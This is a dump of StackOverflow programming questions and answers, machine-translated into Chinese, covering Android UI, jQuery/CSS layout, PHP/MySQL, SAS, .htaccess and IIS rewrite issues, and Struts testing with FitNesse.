# StackOverflow 问答 15111000-15111999

# android - 如何将禁用的按钮设置为灰色或阴影？

> ID：15111000
> 
> 赞同：1
> 
> 时间：2013-02-27T11:31:05.463
> 
> 标签：android

我有一个 xml，其中包含具有图像背景的按钮。其中一些是禁用的，但是当我在其上放置图像背景时，禁用的按钮将不会设置为灰色背景。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:33:18.147

创建一个可绘制的选择器背景，为不同的状态提供不同的图像，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:44:34.603

What you need are `selector` tags.You dont even need to care about programming `onFocus()` etc.Its very easy and simple.You need to construct an xml layout once and it will do the rest.

after adding your drawable button backgrounds to the drawable folder you need to add a selector like this one:

**(res/drawable/new_button.xml)**

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:drawable="@drawable/button_pressed_yellow"
          android:state_pressed="true" />
    <item android:drawable="@drawable/button_focused_orange"
          android:state_focused="true" />
    <item android:drawable="@drawable/button_normal_green" />
</selector> 
```

Now just set this drawable to your button background like:

```
 <Button
        android:id="@+id/imageButtonSelector"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:background="@drawable/new_button" /> 
```

Your works done. [Here](http://www.mkyong.com/android/android-imagebutton-selector-example/) is tutorial with sample project source code for you to follow.

# android - UiAutomator getLastTraversedText()

> ID：15111001
> 
> 赞同：8
> 
> 时间：2013-02-27T11:31:06.077
> 
> 标签：android, android-webview, ui-automation, android-uiautomator

我正在尝试使用 Android UiAutomator 测试 Android Webview。据我了解[文档](http://developer.android.com/tools/help/uiautomator/UiDevice.html#getLastTraversedText)，滚动浏览 WebvView 会生成 UI 遍历事件，这些事件应该可以通过`getUiDevice().getLastTraversedText().`

但是，当我使用`getUiDevice().pressDPadDown()`滚动浏览网页视图时，`getUiDevice().getLastTraversedText()`一直返回 null。

我错过了什么？

如果有人接到这个电话，我将非常感谢一个简短的代码示例。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-10T19:57:39.630

坏消息：我已经花了几个小时试图弄清楚如何让它工作，但是除了 null 之外，我还没有得到任何东西来响应对`getUiDevice().getLastTraversedText()`.

仅供参考，这是我尝试并发现的事情：

*   运行应该转储所有辅助功能事件`uiautomator events`。`adb shell`它肯定会报告各种事件，但是当我手动滚动浏览 WebView 的内容时它几乎是无声的。如果 WebView 中的内容被滚动，例如在向上或向下导航超出屏幕上显示的内容后，我会报告以下类型的事件：

`03-10 19:44:47.436 EventType: TYPE_VIEW_SCROLLED; EventTime: 911700; PackageName: com.example.simplewebview; MovementGranularity: 0; Action: 0 [ ClassName: android.webkit.WebView; Text: []; ContentDescription: null; ItemCount: -1; CurrentItemIndex: -1; IsEnabled: true; IsPassword: false; IsChecked: false; IsFullScreen: false; Scrollable: true; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: 0; ScrollY: 270; MaxScrollX: 0; MaxScrollY: 544; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0`

*   如果我启用按触摸浏览可访问性设置，则我无法在`adb shell`. 每次我运行 uiautomator 命令时，我都会收到`Killed`. 我正在使用 Explore-By-Touch 来朗读显示的文本。虽然我无法导航到启用 Explore-By-Touch 的所有链接（或者当使用作为 Android Accessibility Suite 一部分的令人愤怒的 Virtual D-Pad 时）它确实读出了一些链接的 LinkText（例如，它跳过了我用来测试[http://pickalize.info/](http://pickalize.info/)的页面上的日文字符）

*   如果我运行类似于您的脚本（对于我为此目的创建的简单 WebView 应用程序），那么我可以看到 WebView 中的 UI 突出显示了各种元素，在我的情况下，来自以下网页的 Web 链接我正在调查其他原因在时间[http://pickalize.info/](http://pickalize.info/)当前所选链接的背景变为淡蓝色，但是调用没有返回文本`getUiDevice().getLastTraversedText()`

我最好的猜测是我们要么不恰当地尝试使用该方法。也许我们应该请求并解析 WebView 的 DOM（天知道怎么做），但是请参阅 getLastTraversedText() 文档中的以下注释

`When the view control used can return a reference to is Document Object Model, it is recommended then to use the view's DOM instead.`

顺便说一句：我正在物理设备上使用 Android 4.2.2 进行测试。

祝你调查顺利。我会不时地查看问题，以帮助我更多地了解 Ui Automator 的适用性和功能。

更新（2013 年 3 月 26 日）：我在设备的辅助功能设置菜单中将“增强网络辅助功能”设置为“允许”再次进行了测试。我仍然得到 null 返回`getLastTraversedText()`

这是我的测试代码的内容：

公共类 WebViewNavigator 扩展 UiAutomatorTestCase {

```
public void testNavigationDownGeneratesEventText() throws UiObjectNotFoundException {
    getUiDevice().pressHome();
    UiObject allAppsButton = new UiObject(new UiSelector().description("Apps"));
    allAppsButton.clickAndWaitForNewWindow();

    UiObject appsTab = new UiObject(new UiSelector().text("Apps"));
    appsTab.click();

    UiScrollable appViews = new UiScrollable(new UiSelector().scrollable(true));
    appViews.setAsHorizontalList();

    String nameOfAppToLaunch = "SimpleWebView";
    UiAutomatorHelpers.launchAppCalled(nameOfAppToLaunch);

    UiObject simpleWebViewValidation = new UiObject(new UiSelector().packageName("com.example.simplewebview"));
    assertTrue("The package name seems incorrect for the app we want to launch", simpleWebViewValidation.exists());
    simpleWebViewValidation.clickAndWaitForNewWindow();

    // Ok we should have started the app now... On to the test

    Log.i("WebViewNavigatorTest", "About to start navigating down the contents of the webview");
    int closeToInfinity = 10;
    for (int i = 0; i < closeToInfinity; i++) {
        boolean goneDown = getUiDevice().pressDPadDown();
        if (!goneDown) {
            break;
        }

        String lastTraversedText = getUiDevice().getLastTraversedText();
        if (lastTraversedText != null) {
            Log.i("WebViewNavigatorTest", lastTraversedText);
        } else {
            Log.w("WebViewNavigatorTest", "(null) returned for getLastTraversedText()");
        }
    }   
} 
```

}

这是我在 Android 设备上执行此代码时用来查看消息的 adb 命令： `adb logcat WebViewNavigatorTest:I *:S`

接着是输出：

```
I/WebViewNavigatorTest(29358): About to start navigating down the contents of the webview
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText()
W/WebViewNavigatorTest(29358): (null) returned for getLastTraversedText() 
```

# javascript - 将超链接应用到整个 DIV 区域？

> ID：15111005
> 
> 赞同：0
> 
> 时间：2013-02-27T11:31:18.613
> 
> 标签：javascript, jquery, html, css, hover

我正在构建我的网站的一个元素，允许用户将鼠标悬停在图像和一段文本上。

这是我的**演示**：http: [//jsfiddle.net/j74Gc/](http://jsfiddle.net/j74Gc/)

悬停时的 css 过渡动画效果很好，但是，我想知道，**是否可以将超链接应用于整个区域**？那么如果用户点击图片或文字，或者该区域的任何地方`projects_container_proj`，它会链接到 1 页吗？

这是我目前使用的 HTML：

```
<section id="lastprojects3-920639076" class="home_widget recentProjects3 two columns" style="width:200px">
<div class="projects_container_proj">
    <div style="margin-top: 20px;" class="project_list_s3">
        <ul class="slides_container jcarousel-skin-tango">
            <li>
            <div class="slides_item post-thumb" onmouseover="$(this).find('.hover_the_thumbs').css('background-color','rgba(0, 0, 0, 0.6)'); $(this).find('.magnify_this_thumb').css('left', '51%').css('opacity',1); $(this).find('.hyperlink_this_thumb').css('left', '43%').css('opacity',1); $(this).children('div').css('background','#4a90c2'); $(this).find('.p_title a').css('color', 'white'); $(this).find('.p_exerpt p').css('color', 'white'); $(this).find('.p_title').css('border-top', '4px solid #3b739b');" onmouseout="$(this).find('.hover_the_thumbs').css('background-color','rgba(0, 0, 0, 0)'); $(this).find('.magnify_this_thumb').css('left', '-15%').css('opacity',0); $(this).find('.hyperlink_this_thumb').css('left', '105%').css('opacity',0); $(this).children('div').css('background','#EEE'); $(this).find('.p_exerpt p').css('color', ''); $(this).find('.p_title a').css('color', ''); $(this).find('.p_title').css('border-top', '4px solid #DDD');">
                <ul class="ch-grid">
                    <li>
                    <div class="ch-item">
                        <a style="position: relative; float: left; width: 100%; height: 100%; overflow:hidden;" href="/?post_type=portfolio&#038;p=1333">
                        <img class="img_thumb" alt="" src="http://placehold.it/200x200" style="position:relative; height:100%; width: 100%;"/></a>
                        <a class="flex_this_thumb" href="#"></a>
                        <div class="hover_the_thumbs" style="position: absolute; float: left; width: 100%; height: 100%;">
                            <div class="hyperlink_this_thumb" onclick="window.location = $(this).parents('.ch-item').children('a').eq(0).attr('href');" onmouseover="$(this).css('background','#4a90c2');" onmouseout="$(this).css('background','white');" style="position: absolute; width: 30px; height: 30px; top: 43%; float: left; left: 99%; color: black; background: white;">
                                <img src="#" style="margin-top: 7px; opacity: .8 !important;"/>
                            </div>
                        </div>
                    </div>
                    </li>
                </ul>
                <div class="no-flicker" style="position: relative; background: #EEE; padding-bottom: 15px; -webkit-transition: all 0.4s ease-in-out; -moz-transition: all 0.4s ease-in-out; -o-transition: all 0.4s ease-in-out; -ms-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;">
                    <div style="height: 52px;">
                        <div style="padding-left: 15px; padding-top: 6px; border-top: solid 4px #DDD; -webkit-transition: all 0.4s ease-in-out; -moz-transition: all 0.4s ease-in-out; -o-transition: all 0.4s ease-in-out; -ms-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;" class="p_title no-flicker">
                            <a style="-webkit-transition: all 0.4s ease-in-out; -moz-transition: all 0.4s ease-in-out; -o-transition: all 0.4s ease-in-out; -ms-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;" href="/?post_type=portfolio&#038;p=1333">Title</a>
                        </div>
                    </div>
                </div>
            </div>
            </li>
        </ul>
    </div>
</section> 
```

谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:37:43.653

也许您可以将`<a>`标签与`display: block`属性一起使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:48:39.100

这将工作..

```
.blockLink  
{  
    position:absolute;  
    top:0;  
    left: 0;  
    width:100%;  
    height:100%;  
    z-index: 1;  
    background-color:#ffffff;   
    -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";  
    filter: alpha(opacity=0);  
    opacity:0;  
}

<div style="position:relative">  
    <some content>  
    <a href="somepage" class="blockLink" />  
<div> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:59:38.327

是的，你可以这样做：

```
$('.projects_container_proj').children().click(function(){
     window.location= 'your url';
 }); 
```

希望能帮助到你 ：）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-02T07:29:08.657

如果您想在没有 javascript 的情况下执行此操作，可以将 div 包装在**a标记内。**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T11:35:16.587

试试这个：

```
<div class="projects_container_proj" onclick="window.location='http://www.google.com';">
    Other things here
</div> 
```

# javascript - jQuery边距取决于元素宽度

> ID：15111007
> 
> 赞同：1
> 
> 时间：2013-02-27T11:31:23.310
> 
> 标签：javascript, jquery, html

我想将使用 jquery 的 css 样式应用于具有固定宽度的元素。

我想让它的左边距是（减去）元素的宽度除以二。

我怎样才能做到这一点？

这是CSS：

```
.top_middle{
    width: 33%;
    overflow: hidden;
    height: 49%;
    position: absolute;
} 
```

我尝试过这样的事情，但它不起作用：

```
 var width = $('.top_middle').width()

    $('.top_middle').css(function(){
        'margin-left' : - "width" / 2
    }) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:34:27.257

在您的函数中，您的“”标记中有宽度，这意味着它将作为字符串运行，而不是获取变量尝试

编辑：您的函数对于 jquery 语法似乎是错误的尝试

```
 var width = $('.top_middle').width() / 2;
$('.top_middle').css('margin-left',-width); 
```

请参阅此处的示例[http://jsfiddle.net/domjgreen/ydEwx/2/](http://jsfiddle.net/domjgreen/ydEwx/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:35:48.020

在您的代码中，您试图将字符串“width”除以 2，这不是您想要的。您想将变量宽度除以 2，如下所示：

```
$('.top_middle').css({
    marginLeft : - (width / 2) + 'px'
}); 
```

此外，您将一个函数传递给 css()，您应该传递一个对象或一对与 css 属性相对应的参数以及您要为其设置的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:36:54.527

试试这个

```
var halfwidth = $('.top_middle').width()/2;
$('.top_middle').css({'margin-left' : "-" + halfwidth }); 
```

# javascript - 如何始终具有相同数量的固定宽度 每行在单一流体中 ?

> ID：15111008
> 
> 赞同：0
> 
> 时间：2013-02-27T11:31:23.273
> 
> 标签：javascript, jquery, css

可以说我`<li>`在一个单一的流体中有 10 个`<ul>`。如果我调整浏览器的大小，`<li>`将进入下一行。还可以说我们希望`<ul>`页面居中：

html:

```
<ul>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
   <li>Lorem</li>
</ul> 
```

CSS：

```
ul {
   text-align: center;
}

li {
    display: inline-block;
    text-align: left;
} 
```

这将使我们居中`<ul>`，但显然如果我们有 10 个`<li>`并且页面/屏幕尺寸每行只有 4`<li>`个，那么我们将有 2 个`<li>`居中在最后一行，而不是与`<li>`前一行的第一行对齐。

我不确定我想要实现的目标是否只能使用 css 来完成（我认为如果每一行都不同`<ul>`，那没关系，但我只想要 1 `<ul>`。

所以我想知道这个技巧是否可以和/或应该使用 jquery 来完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:51:55.050

您需要将您的 ul 放入包含 div 并对齐该中心，然后将您的 ul 左对齐并使其成为内联块：

[http://jsfiddle.net/pdfbG/](http://jsfiddle.net/pdfbG/)

**html**

```
<div>
    <ul>
       <li>Test</li>
       <li>Lorem</li>
       <li>Another one</li>
       <li>Lorem</li>
       <li>Lorem</li>
       <li>Lorem</li>
       <li>Lorem</li>
       <li>Lorem</li>
       <li>Lorem</li>
       <li>Lorem</li>
    </ul>
</div> 
```

**css**

```
div {text-align:center;}
ul {
    margin:0;
    list-style:none;
    display: inline-block;
    text-align:left;
}

li {
    display: inline-block;
    text-align: left;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:42:59.843

您需要使`li`元素的宽度为 10% 以使它们流动：

```
li {
    display: inline-block;
    text-align: left;
    border: 1px #AAA solid;
    width: 10%;
    font-size: 14px;
    box-sizing: border-box;
    vertical-align: top;
} 
```

[http://jsfiddle.net/CdWaY/](http://jsfiddle.net/CdWaY/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:40:20.570

```
ul {
 text-align: center;
 display:table;
 width: 400px; //example
} 
```

li { display: inline-block; 文本对齐：左；}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:40:46.350

在宽度上使用 calc 函数

```
width:calc(100%-your margins in px or %); 
```

我希望这行得通

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-02-27T11:37:42.200

Simply make the width 10% and they will resize on their own

```
width: 10%; 
```

# java - 从 MySql / Java 检索和显示 PDF 文档

> ID：15111010
> 
> 赞同：0
> 
> 时间：2013-02-27T11:31:34.497
> 
> 标签：java, swing, jakarta-ee, jdbc

我正在尝试将我的 Java 程序生成的 PDF 保存到 Mysql 数据库中，并尝试在 Java 程序中检索/显示相同的内容。以下代码有我到目前为止所做的，

```
public class Save_PDFimage extends javax.swing.JFrame {
    private ImageIcon format = null;
    Connection conn = null;
    ResultSet rs=null;
    PreparedStatement pst=null;
    //String filename = "C:\\Users\\***\\Desktop\\n.png";
    String filename = "C:\\Users\\***\\Desktop\\in.pdf";
    int s = 0;
    byte[] person_image = null;

private void Save_DBActionPerformed(java.awt.event.ActionEvent evt) {
    try {
    File image = new File(filename);
    FileImageInputStream FIS = new FileImageInputStream(image);
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    byte[] buf = new byte[1024];
    for(int readNum; (readNum=FIS.read(buf))!=-1;) {
    bos.write(buf,0,readNum);
    }
    person_image = bos.toByteArray();
    } catch(Exception e)
    {
    JOptionPane.showMessageDialog(null, e);
    }

    try {
    String sql = "Insert into invoices (Pdfs, Invoice_no_R) values(?,?)";
    String i= "1";
    pst = conn.prepareStatement(sql);
    pst.setBytes(1, person_image);
    pst.setString(2, i);
    pst.execute();
    } catch(Exception e)
    {
    JOptionPane.showMessageDialog(null, e);
    }
    }

// Code for displaying the retrieved PDF in a jLabel

   private void Show_imageActionPerformed(java.awt.event.ActionEvent evt) {
    try {
        String sql = "select Pdfs from invoices where Invoice_no_R = 1";
        pst = conn.prepareStatement(sql);
        rs = pst.executeQuery();

        if (rs.next())
        {
        byte[] Imagedata = rs.getBytes("Pdfs");
        format = new ImageIcon(Imagedata);
        jLabel1.setIcon(format);
        }
    } catch(Exception e ) {
        JOptionPane.showMessageDialog(null, e);
        e.printStackTrace();
    } } 
```

我可以保存 PDF，但程序在检索后不显示图像，同样的逻辑适用于 PNG/JPG 文件。

请帮忙...

拉梅什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:34:16.583

pdf 不是图像格式 - 它是二进制格式。您不能将其设置为您的 imageicon 的图标。

# javascript - 在绑定 youtube 事件时规避 Flash 播放器错误

> ID：15111015
> 
> 赞同：0
> 
> 时间：2013-02-27T11:31:47.977
> 
> 标签：javascript, firefox, youtube-api

我正在使用以下[代码](https://stackoverflow.com/questions/7988476/listening-for-youtube-event-in-javascript-or-jquery/7988536#7988536)来绑定`onStateChange`iframe 中包含的 Youtube Player 的事件。在问题中，我通过javascript生成youtube播放器的代码对我来说不是一个选择。

我在 Firefox 中遇到了这个[错误。](https://stackoverflow.com/questions/13100611/replace-url-from-youtube-to-embed-code-error-permission-denied-to-access-prop)

```
Error: Permission denied to access property 'toString' 
```

如问题中所述，我无法解决此问题，因为 adobe 或 google 显然必须这样做。

我的问题是我绑定到`onStateChange`事件的回调函数没有被调用。我的代码在 Safari 中完美运行，但在 Firefox 中却不行。

我想这个错误会阻止我正确设置回调函数。有没有人已经为这个问题写了一个解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T20:39:01.990

我无法评论您在 Firefox 中看到的特定错误。

不过，您应该知道，有一些替代方法可以在页面上动态插入 YouTube iframe 播放器以响应点击占位符元素。

我有一些使用静态图像缩略图（带有鼠标悬停“播放”图标）的示例，`<iframe>`单击它们会变成自动播放的播放器。[您可以在http://ytdirectlite.appspot.com/static-min/submit.html](http://ytdirectlite.appspot.com/static-min/submit.html)底部的提交小部件中的“我的 YouTube 视频”选项卡中看到一个实时示例，并在以下位置查看源代码

[https://code.google.com/p/youtube-direct-lite/source/browse/static/css/index.css#150](https://code.google.com/p/youtube-direct-lite/source/browse/static/css/index.css#150) [https://code.google.com/p/youtube-direct-lite/source /browse/static/js/ytdl/panels/existing.js](https://code.google.com/p/youtube-direct-lite/source/browse/static/js/ytdl/panels/existing.js) [https://code.google.com/p/youtube-direct-lite/source/browse/static/js/ytdl/player.js](https://code.google.com/p/youtube-direct-lite/source/browse/static/js/ytdl/player.js)

# if-statement - 如何在 SAS 中将 if 语句用于格式 xx 的变量值

> ID：15111017
> 
> 赞同：0
> 
> 时间：2013-02-27T11:31:53.263
> 
> 标签：if-statement, format, sas

我正在尝试使用一系列 if 和 else 语句，用于：

```
if var1 = 1 then var2 = "day 1";

else if var1 = 2 then var2 = "day 2"; 
```

以上位工作正常。

然后我有`var1`1.1 和 1.2 和 2.1 等的值。我想要的是，如果 的值`var1`是 xx 格式（一个小数点后的值），那么`var2 = "No day assigned"`.

我不确定如何在 SAS 中进行编程？

任何指针将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:23:01.600

我会使用 MOD 函数来确定 var1 是否为整数。如果您的上述逻辑适用于所有值（即天数与 var1 相同），那么您还可以将 if 语句简化为一行。

```
data test;
input var1;
length var2 $15;
var2=ifc(mod(var1,1)=0,cats('day ',var1),'No day assigned');
cards;
1
2
1.1
2.1
3
4
;
run; 
```

# php - PHP 定义值在包含文件中丢失

> ID：15111022
> 
> 赞同：2
> 
> 时间：2013-02-27T11:32:05.473
> 
> 标签：php, variables

我有一个 config.php 文件，里面有这一行：

`define("home_dir",'soft06/site_name');`

在 index.php 文件中我有：

```
include_once ("config.php")
... some html code ....
include_once (home_dir."/footer.php") 
```

效果很好。但是，如果在 footer.php 我把这一行：

```
echo("home_dir=".home_dir); 
```

我得到：

```
Notice:  Use of undefined constant home_dir - assumed 'home_dir' in <b>D:\xampp\htdocs\footer.php on line 3
home_dir=home_dir 
```

但是如果我选择像这样包含footer.php： `include_once ("footer.php")`而不是`include_once (home_dir."/footer.php")` 它可以正常工作。

在我看来，如果我在 include_once 函数中使用常量 home_dir，我将丢失包含文件中的 home_dir 值。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T06:06:13.823

那么你

```
include_once (home_dir."/footer.php") 
```

试图通过 http 包含文件 :^ ) 并且它在包含之前已被执行。所以在另一个 http 请求中运行的 footer.php 并没有定义 home_dir。

您必须使用本地路径进行包含。

# apache - 使用 htaccess 获取漂亮的 URL

> ID：15111026
> 
> 赞同：0
> 
> 时间：2013-02-27T11:32:15.143
> 
> 标签：apache, .htaccess, url

我想重写（缩短）例如**website.com/contact.html**到**website.com/contact-us**，但我不知道我做错了什么。它只是显示“页面没有正确重定向”或“找不到页面”或其他一些致命错误。请注意，我不是在寻找隐藏扩展名的方法。

这是我的 HTML 文件：

```
<a href="contact-us">Contact</a> 
```

.htaccess 中的重写规则：

```
RewriteEngine on
RewriteRule ^contact-us http://www.website.com/contact.html 
```

基本上我只是想弄清楚如何美化 URL。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T07:29:39.090

好的，这有效：

```
RewriteEngine on
RewriteRule ^contact-us contact.html 
```

# javascript - 无法调用基于参数的基于 jquery 的函数？

> ID：15111029
> 
> 赞同：0
> 
> 时间：2013-02-27T11:32:19.643
> 
> 标签：javascript, jquery, jquery-ui, function

我有一个有效的 jquery 函数，我可以通过 php 像这样调用它

```
if (!order) 

        {   echo '<script>
$(function() {
$this = $("#ui-accordion-accordion-panel-0");
//  parent tab
var parent = $("#accordion").parent();
//parent.adderror();

// the content
$this.adderror();

// the header
var header = $this.attr("aria-labelledby");
$("#"+header).adderror();

// the tab
var tab = parent.attr("aria-labelledby");
$("#"+tab).parent().adderror();
});

    </script>';} 
```

我想让它成为一个全局函数（如果在 .js 文件中外部定义更好），我可以从我的 php 中的任何位置调用它，它将面板作为参数。

所以我基本上会调用 - show_error("#ui-accordion-accordion-panel-0")。我怎么能这样做？当我尝试定义函数，然后调用它时 - 没有任何变化。通过此处定义的技术使用无济于事（[var functionName = function() {} vs function functionName() {}](https://stackoverflow.com/questions/336859/javascript-var-functionname-function-vs-function-functionname)）

提前致谢

好的，我现在有一个 error.js 文件，我已正确链接（）

```
function show_error(selector) {
var $this = $(selector);

//  parent tab
var parent = $("#accordion").parent();

//parent.adderror();

// the content
$this.adderror();

// the header
var header = $this.attr("aria-labelledby");
$("#"+header).adderror();

// the tab
var tab = parent.attr("aria-labelledby");
$("#"+tab).parent().adderror();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:36:11.297

外部 .js 文件中的函数如下所示：

```
function show_error(selector) {
    var $this = $(selector);
    //  parent tab
    var parent = $("#accordion").parent();
    //parent.adderror();

    // the content
    $this.adderror();

    // the header
    var header = $this.attr("aria-labelledby");
    $("#"+header).adderror();

    // the tab
    var tab = parent.attr("aria-labelledby");
    $("#"+tab).parent().adderror();
} 
```

# php - 我想从 mysql 数据库中获取复选框值

> ID：15111031
> 
> 赞同：3
> 
> 时间：2013-02-27T11:32:32.503
> 
> 标签：php, mysql

我想从 mysql 数据库中获取复选框值。我试过循环和数组，但它不工作

**这里是我的 PHP 代码**

```
 <form action="" name="color1" id="color1" method="post"> 
  <br />
  <?php
  $count=10;
  $querycolor=mysql_query("select color,id from products order by id");
  while($rowcolor=mysql_fetch_array($querycolor))
  $count++;
  {
  for($i=0; $i<=count; $i++) {    
  $colors=$rowcolor['color'][$i];
  $colorid=$rowcolor['id'];
  }
   ?>
 <input name="checkbox[]" type="checkbox" id="checkbox[]" value="" onclick="window.location='search.php?<?php echo $colors ?>';"><?php echo $rowcolor['color'];?><br /> 
 <?php }?>       
 </form> 
```

**例如，我想像这样显示复选框值**

```
1) White (2)<br>
2) Black (3)<br>
3) Blue (10)<br> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:45:14.507

Use [COUNT()](http://dev.mysql.com/doc/refman/5.1/en/counting-rows.html) function:

Query:

```
SELECT count(id) as cnt, color, id
FROM products 
GROUP By color
order by id 
```

Then you can print cnt like `$rowcolor['cnt'];`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:50:24.483

你可以这样做

```
<form action="" name="color1" id="color1" method="post"> 
  <br />
  <?php
  $count=10;
  $querycolor=mysql_query("select color,id from products order by id");
  while($rowcolor=mysql_fetch_array($querycolor))
  $count++;
  {
  for($i=0; $i<=$count; $i++) {    
  $colors=$rowcolor['color'][$i];
  $colorid=$rowcolor['id'];
         ?>
 <input name="checkbox[]" type="checkbox" id="checkbox[]" value="<?php echo $colors.'('.$colorid.')';?>" onclick="window.location='search.php?<?php echo $colors ?>';"><?php echo $rowcolor['color'];?><br /> 
 <?php } } ?>       
 </form> 
```

希望这可以帮助

# struts - 如何设置 FitNesse 以用于基于 struts 的应用程序？

> ID：15111033
> 
> 赞同：0
> 
> 时间：2013-02-27T11:32:35.207
> 
> 标签：struts, automated-tests, integration-testing, fitnesse

我基本上需要调用 Struts 动作类的 execute() 方法。这甚至可能吗。如果是，我如何为执行调用加载 ActionMapping、ActionForm、HttpServletRequest 和 HttpServletResponse 对象。

加载 Spring 配置：

```
public class SpringColumnFixture extends ColumnFixture { 
    private static final ApplicationContext appContext = 
         new GenericXmlApplicationContext(new String[]{"classpath:spring/*.xml"});
} 
```

尝试执行的测试：

```
ActionForm form = new IncidentDetailsForm(); 
ActionMapping mapping = new ActionMapping();
HttpServletResponse response = new MockHttpServletResponse(); 

MockHttpServletRequest request = new MockHttpServletRequest() { 
   @Override public String getMethod() { 
       return "GET"; }
}; 

request.setAttribute("userName","****"); 
request.setParameter("userName","****"); 
forward = appContext.getBean(AppLandingAction.class).execute(mapping, form, request, response); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T10:54:43.890

终于解决了问题。我必须将所有 websphere jar 放入 JAXRPC 进行初始化，并将我的代码更改为以下内容。这有助于我解决问题。

ActionForm 表单 = new ActionForm() {};

```
 In******Form form1 = new In******Form();
        form1.setActionType("View");

        ActionMapping mapping = new ActionMapping();
        mapping.addForwardConfig(new ActionForward("success","/action/viewCeraHome", false));
        mapping.addForwardConfig(new ActionForward("noLogin","/loginError.jsp", false));

        HttpServletResponse response = new MockHttpServletResponse();
        MockHttpServletRequest request = new MockHttpServletRequest(){
            @Override
            public String getMethod() {
                return "GET"; 
            }

            @Override
            public HttpSession getSession(boolean create) {
                return super.getSession(true);
            }

        };

        request.setAttribute("userName","*****");
        request.setParameter("userName","*****");

        //forward = appContext.getBean(Ap*****Action.class).execute(mapping, form, request, response);
        appContext.getBean(Ap*****Action.class).execute(mapping, form, request, response);
        forward = appContext.getBean(Inc******Action.class).execute(mapping, (ActionForm)form1, request, response); 
```

现在我希望专家过来让我知道我在夹具代码中使用的标准是否合适，或者我是否需要采用不同的方法。

# asp.net - 网站配置中的 URL 重写错误

> ID：15111037
> 
> 赞同：0
> 
> 时间：2013-02-27T11:33:02.277
> 
> 标签：asp.net, url-rewriting, aspdotnetstorefront

我正在尝试在本地机器上配置一个 ASPDotNetStoreFront 应用程序，该应用程序在实时服务器上运行良好。

尝试在本地运行它时出现错误

> `HTTP Error 500.52 - URL Rewrite Module Error.`

我浏览了许多文章和论坛，但无法解决问题。我使用的是 Windows 7，IIS7 和 Target 框架是 3.5，AspDotNetStoreFront 版本是 9.1.0.1

错误消息屏幕截图如下

![在此处输入图像描述](../Images/fd337ca6b7b1349d73460446d5d66564.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:58:31.140

这是因为子虚拟目录从父节点（这里是站点根目录）继承了设置。所以虚拟目录中会有重复的重写规则。您可以使用以下元素禁用继承：

```
<location path="." inheritInChildApplications="false">
<system.webserver>
 ...
<system.webserver>
</location> 
```

但是，不建议将站点和虚拟目录指向相同的物理路径。这样，站点中的任何配置更改都将复制到虚拟目录。显然，虚拟目录上的更改也将被复制到站点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-31T17:03:23.407

我建议不要使用默认网站或 localhost 作为绑定，而是使用 staging.aspdotnetstorefront.[yourdomainhere].local 或类似名称。之后，您可以通过添加 127.0.0.1 staging.aspdotnetstorefront.[yourdomainhere].local 来修改主机文件以进行循环。这样就没有要继承的设置。

如果出于许可原因确实需要 localhost，您可以随时更改绑定上的端口（IE localhost:88）。

我还应该提到，您可能需要修改您的解决方案（如果您使用的是源代码）以使 Web 项目指向更新的绑定。

# javascript - 如何在事件按钮旁边打开弹出窗口 - 如何在点击时获取鼠标光标位置？

> ID：15111038
> 
> 赞同：3
> 
> 时间：2013-02-27T11:33:10.920
> 
> 标签：javascript, html, onclick, mouse, coordinates

